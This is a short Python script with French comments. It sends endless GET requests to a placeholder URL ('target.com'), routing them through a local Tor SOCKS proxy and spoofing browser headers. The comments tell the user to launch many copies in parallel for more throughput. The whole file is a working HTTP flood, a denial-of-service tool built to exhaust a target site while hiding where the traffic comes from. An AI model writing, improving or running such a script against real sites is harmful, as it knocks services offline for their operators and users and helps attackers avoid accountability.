#!/usr/bin/python3

import requests
import random

# pip install requests[socks]
# ./script.py & ./script.py & ./script.py & ./script.py & ./script.py, etc... pour plus de perforance

url = "http://target.com/page/"

torport = 9050
proxies = {
    'http': "socks5h://localhost:{}".format(torport),
    'https': "socks5h://localhost:{}".format(torport)
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0',
    'From': url,
    'Referer': url
}
i = 0

while True:
        try:
                response = requests.get(url, headers=headers, verify=False, proxies=proxies)
                print("[+] OK", i)
        except:
                print("[-] Erreur")
        i += 1
